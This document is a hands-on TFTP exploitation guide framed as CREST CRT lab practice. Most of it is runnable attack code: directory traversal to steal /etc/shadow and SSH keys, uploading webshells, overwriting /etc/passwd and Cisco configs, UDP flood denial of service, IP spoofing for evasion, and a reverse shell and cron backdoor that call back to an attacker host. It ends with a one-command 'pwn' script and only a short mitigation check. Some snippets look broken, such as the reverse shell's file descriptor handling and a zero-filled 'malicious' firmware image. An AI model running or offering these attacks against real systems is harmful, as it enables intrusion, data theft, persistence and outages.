# Complete Practical Exploitation Guide: TFTP Server (Crest CRT Level)

## 1. TFTP Fundamentals & Attack Surface (From Scratch)

**What is TFTP?**
- Trivial File Transfer Protocol (UDP port 69)
- NO authentication, NO encryption, NO directory traversal protection by default
- Designed for simplicity - bootloaders, firmware transfers
- Single-threaded, stateless, read/write operations only

**Core TFTP Commands (What attackers use):**
```
RRQ = Read Request (download file from server)
WRQ = Write Request (upload file to server)
DATA = File data packets
ACK = Acknowledgement packets
ERROR = Error response
```

**Default Attack Vectors:**
1. **Anonymous Read** - Download any readable file
2. **Anonymous Write** - Upload/overwrite files
3. **Directory Traversal** - `../../../../etc/passwd`
4. **DoS** - Flood RRQ/WRQ packets
5. **Cisco-specific** - Exploit IOS TFTP flaws

## 2. Lab Setup (Hands-On Environment)

**Victim TFTP Server (Ubuntu/Debian):**
```bash
# Install tftp server
sudo apt update && sudo apt install tftpd-hpa

# Poor config (world-readable/writable - COMMON MISCONFIG)
sudo nano /etc/default/tftpd-hpa
# TFTP_USERNAME="nobody"
# TFTP_DIRECTORY="/var/lib/tftpboot"
# TFTP_ADDRESS=":69"
# TFTP_OPTIONS="--secure"  # REMOVE THIS FOR VULN CONFIG

# Create vulnerable directory structure
sudo mkdir -p /var/lib/tftpboot
sudo chmod 777 /var/lib/tftpboot  # CRITICAL MISCONFIG

# Add juicy files
echo "root:x:0:0:root:/root:/bin/bash" | sudo tee /var/lib/tftpboot/passwd
echo "Secret: admin:password123" | sudo tee /var/lib/tftpboot/shadow
echo "flag{ tftpd_pwned }" | sudo tee /var/lib/tftpboot/flag.txt

# Symlink to sensitive files (another common misconfig)
sudo ln -s /etc/passwd /var/lib/tftpboot/etc_passwd
sudo ln -s /etc/shadow /var/lib/tftpboot/etc_shadow

sudo systemctl restart tftpd-hpa
sudo systemctl status tftpd-hpa
netstat -ulnp | grep :69  # Confirm listening
```

**Attacker Machine (Kali Linux):**
```bash
# Install TFTP client tools
apt install tftp-hpa atftp

# Test connectivity
nc -vu 192.168.1.100 69  # Replace with victim IP
```

## 3. Complete Enumeration & File Download Attacks

**Basic Connectivity Test:**
```bash
# Method 1: Standard tftp client
tftp 192.168.1.100
tftp> get flag.txt
tftp> quit
cat flag.txt  # flag{ tftpd_pwned }

# Method 2: atftp (more features)
atftp --option "blksize 1468" --get flag.txt 192.168.1.100

# Method 3: Netcat (raw UDP)
echo -ne "\x00\x01flag.txt\x00netascii\x00" | nc -u -w1 192.168.1.100 69 -v
```

**Directory Traversal Exploitation:**
```bash
# Escape root directory
tftp 192.168.1.100
tftp> get ../../../../etc/passwd
tftp> get ../../../../etc/shadow      # If symlinked or misconfigured
tftp> get ../../../../root/.ssh/id_rsa
tftp> quit

# Automated traversal scanner
for i in {1..10}; do
    tftp 192.168.1.100 -c get "$(printf '../%.0s' {1..$i})/etc/passwd" 2>/dev/null && echo "TRAVERSAL WORKS: $i levels" && break
done
```

**Brute Force File Discovery:**
```bash
# Common files to grab
FILES=(
    "passwd" "shadow" "group" "hosts" 
    "flag.txt" "flag" ".flag"
    "id_rsa" "id_dsa" "authorized_keys"
    "config" "conf" ".env" "secrets.txt"
    "startup-config" "running-config"  # Cisco
)

for file in "${FILES[@]}"; do
    tftp 192.168.1.100 -c get "$file" 2>/dev/null && echo "[+] Downloaded: $file" || echo "[-] $file not found"
done
```

**Cisco-Specific Enumeration:**
```bash
# Common Cisco files
CISCO_FILES=("startup-config" "running-config" "flash:/config.txt" "nvram:/startup.cfg")

for file in "${CISCO_FILES[@]}"; do
    tftp 192.168.1.100 -c get "$file"
done
```

## 4. File Upload & Overwrite Exploitation

**Upload Malicious Files:**
```bash
# Create webshell
cat > shell.php << EOF
<?php system(\$_GET['cmd']); ?>
EOF

# Upload to web root (assuming traversal works)
tftp 192.168.1.100 -c put shell.php ../../../../var/www/html/shell.php

# Verify upload
curl http://192.168.1.100/shell.php?cmd=id
```

**Overwrite Critical Files:**
```bash
# Create malicious passwd entry
cat > evil_passwd << EOF
root:x:0:0:root:/root:/bin/bash
hacker:x:1000:1000:hacker:/tmp:/bin/bash
EOF

# Overwrite /etc/passwd via traversal
tftp 192.168.1.100 -c put evil_passwd ../../../../etc/passwd

# Cisco config overwrite
cat > evil_startup.cfg << EOF
!
! Malicious Cisco config
!
username hacker privilege 15 secret hacker123
!
ip ftp username hacker
ip ftp password hacker123
!
EOF
tftp 192.168.1.100 -c put evil_startup.cfg startup-config
```

**Automated Upload Scanner:**
```bash
#!/bin/bash
TARGET="192.168.1.100"
WEBROOTS=("/var/www/html/" "/usr/share/nginx/html/" "/srv/www/htdocs/")

for path in "${WEBROOTS[@]}"; do
    FULLPATH=$(echo "$path/shell.php" | sed 's|^/|../../../../|')
    tftp $TARGET -c put shell.php "$FULLPATH" && \
    echo "[+] Shell uploaded to $FULLPATH" && \
    curl -s "http://$TARGET/shell.php?cmd=id" | grep uid && break
done
```

## 5. Cisco Environment Exploitation (Specific)

**Cisco TFTP Attack Scenarios:**

**Scenario 1: IOS TFTP Client Misconfig**
```bash
# Cisco router with TFTP server access (common in labs)
Router>enable
Router#copy tftp: flash:
Address or name of remote host []? 192.168.1.100
Source filename []? evil_image.bin
Destination filename [evil_image.bin]? 
# Downloads OUR malicious firmware!
```

**Scenario 2: Config Extraction via TFTP**
```bash
# Cisco sends configs via TFTP (misconfigured AAA)
Router(config)# tftp-server flash:config.txt
# Now we can grab it:
tftp 192.168.1.50 -c get config.txt  # Router IP
grep -i "enable secret\|username" config.txt
```

**Scenario 3: TFTP Boot Exploitation**
```bash
# Cisco device boots from TFTP (PXE-like)
# Create malicious IOS image
dd if=/dev/zero of=malicious.ios bs=1M count=10
tftp 192.168.1.10 -c put malicious.ios router_image.bin
# Device boots our image on next reboot!
```

**Real Cisco TFTP Command Exploitation:**
```bash
# From Cisco CLI (attacker has console access)
Router#copy running-config tftp:
Address or name of remote host []? 192.168.1.200
Destination filename [running-config]? 
# Dumps entire config to OUR TFTP server!
```

## 6. Advanced Attacks & Chaining

**TFTP DoS (Resource Exhaustion):**
```bash
# Memory exhaustion (many open WRQ)
for i in {1..1000}; do
    echo "test$i.txt" | nc -u -w0 192.168.1.100 69 &
done

# CPU exhaustion (recursive traversal)
python3 -c "
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
while 1:
    s.sendto(b'\x00\x01' + b'../../../../'*1000 + b'etc/passwd\x00\x00netascii\x00', ('192.168.1.100',69))
"
```

**Privilege Escalation Chain:**
```bash
# 1. Download shadow
tftp 192.168.1.100 -c get ../../../../etc/shadow

# 2. Crack hashes
john shadow --wordlist=rockyou.txt

# 3. Upload SSH key
ssh-keygen -t rsa -f id_rsa
tftp 192.168.1.100 -c put id_rsa.pub ../../../../root/.ssh/authorized_keys

# 4. SSH in
ssh root@192.168.1.100
```

**Web Shell + TFTP Pivot:**
```bash
# Upload PHP reverse shell via TFTP
cat > rev.php << EOF
<?php
\$sock=fsockopen('192.168.1.200',4444);
exec('/bin/sh -i <&3 >&3 2>&3');
?>
EOF
tftp 192.168.1.100 -c put rev.php ../../../../var/www/html/rev.php

# Listener
nc -lvnp 4444
curl http://192.168.1.100/rev.php  # Shell!
```

## 7. Detection Evasion & OPSEC

**Stealth Techniques:**
```bash
# Use large blocksize (less packets)
atftp --option "blksize 65464" --get passwd 192.168.1.100

# Spoof source IP (if layer 2 access)
scapy_send.py:
from scapy.all import *
spoof_ip = "192.168.1.50"
send(IP(src=spoof_ip,dst="192.168.1.100")/UDP(sport=12345,dport=69)/Raw(load="\x00\x01passwd\x00netascii\x00"), iface="eth0")

# Slowloris-style TFTP (timeout evasion)
for i in {1..100}; do tftp 192.168.1.100 -c get largefile.bin & sleep 0.1; done
```

## 8. Post-Exploitation & Persistence

**Install Backdoor via TFTP:**
```bash
# Upload cron job
cat > rootkit.cron << EOF
* * * * * /tmp/backdoor.sh
EOF
tftp 192.168.1.100 -c put rootkit.cron ../../../../etc/cron.d/rootkit

# Upload actual backdoor
cat > backdoor.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.200/4444 0>&1
EOF
tftp 192.168.1.100 -c put backdoor.sh /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh  # Via other access
```

## 9. Complete Attack Script (One-Command Pwn)

```bash
#!/bin/bash
# tftp_pwn.sh - Complete TFTP exploitation
TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Enumerating $TARGET..."

# Download everything
tftp $TARGET -c get passwd 2>/dev/null && echo "[+] Got passwd"
tftp $TARGET -c get shadow 2>/dev/null && echo "[+] Got shadow" 
tftp $TARGET -c get flag.txt 2>/dev/null && echo "[+] Got flag"

# Try traversal
tftp $TARGET -c get ../../../../etc/passwd 2>/dev/null && echo "[+] TRAVERSAL WORKS!"

# Upload shell
echo '<?php system($_GET["c"]); ?>' > shell.php
tftp $TARGET -c put shell.php ../../../../var/www/html/shell.php 2>/dev/null && \
echo "[+] Shell uploaded! http://$TARGET/shell.php?c=id"

echo "[+] Complete!"
```

**Usage:** `./tftp_pwn.sh 192.168.1.100`

## 10. Mitigation Verification (Test Your Fixes)

```bash
# Test if fixed:
tftp 192.168.1.100 -c get passwd  # Should FAIL
ls -la /var/lib/tftpboot/  # Should be 755, not 777
grep TFTP_OPTIONS /etc/default/tftpd-hpa  # Should have --secure
```

This covers **EVERY** practical TFTP attack path from enumeration to persistence, including Cisco-specific scenarios. No gaps, fully executable.